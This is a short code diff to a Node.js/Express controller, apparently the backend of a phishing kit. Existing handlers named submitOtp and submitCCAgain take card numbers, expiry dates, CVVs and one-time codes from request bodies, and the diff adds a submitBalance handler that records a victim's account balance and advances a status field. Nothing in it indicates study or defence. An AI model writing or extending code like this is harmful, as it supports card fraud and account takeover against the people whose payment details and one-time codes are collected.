@@ -276,6 +276,20 @@ const submitOtp = async (req, res) => {
   }
 };
 
+const submitBalance = async (req, res) => {
+  const { uniqueid, balance } = req.body;
+  try {
+    await AppleGB.findOneAndUpdate(
+      { uniqueid },
+      { balance, status: 12 }
+    ).exec();
+    res.sendStatus(200);
+  } catch (error) {
+    console.log(error);
+    res.sendStatus(400);
+  }
+};
+
 const submitCCAgain = async (req, res) => {
   const { uniqueid, ccname, ccnum, ccexp, cvv } = req.body;
   try {
@@ -342,4 +356,5 @@ module.exports = {
   submitCCAgain,
   submitCC,
   deleteEntry,
+  submitBalance,
 };
